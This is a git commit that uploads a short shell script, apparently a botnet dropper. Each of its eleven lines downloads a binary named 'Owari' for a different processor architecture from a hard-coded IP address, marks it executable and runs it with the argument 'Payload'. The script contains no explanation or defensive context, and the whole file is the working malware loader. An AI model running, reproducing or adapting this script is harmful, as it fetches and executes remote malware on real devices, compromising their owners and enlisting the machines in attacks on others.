cdbd0e6d89eb13c59450e7ccb3d895c05973dd39
Spine8797aaxx <dichvucodecn331@gmail.com>
2024-12-09 01:01:26 +0700

    Add files via upload

---
+++ phantom (1).sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.108.226/Binarys/Owari.x86; curl -O http://74.48.108.226/Binarys/Owari.x86;cat Owari.x86 >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.108.226/Binarys/Owari.mips; curl -O http://74.48.108.226/Binarys/Owari.mips;cat Owari.mips >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.108.226/Binarys/Owari.mpsl; curl -O http://74.48.108.226/Binarys/Owari.mpsl;cat Owari.mpsl >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.108.226/Binarys/Owari.arm4; curl -O http://74.48.108.226/Binarys/Owari.arm4;cat Owari.arm4 >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.108.226/Binarys/Owari.arm5; curl -O http://74.48.108.226/Binarys/Owari.arm5;cat Owari.arm5 >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.108.226/Binarys/Owari.arm6; curl -O http://74.48.108.226/Binarys/Owari.arm6;cat Owari.arm6 >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.108.226/Binarys/Owari.arm7; curl -O http://74.48.108.226/Binarys/Owari.arm7;cat Owari.arm7 >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.108.226/Binarys/Owari.ppc; curl -O http://74.48.108.226/Binarys/Owari.ppc;cat Owari.ppc >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.108.226/Binarys/Owari.m68k; curl -O http://74.48.108.226/Binarys/Owari.m68k;cat Owari.m68k >robben;chmod +x *;./robben Payload
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://74.48.108.226/Binarys/Owari.sh4; curl -O http://74.48.108.226/Binarys/Owari.sh4;cat Owari.sh4 >robben;chmod +x *;./robben Payload
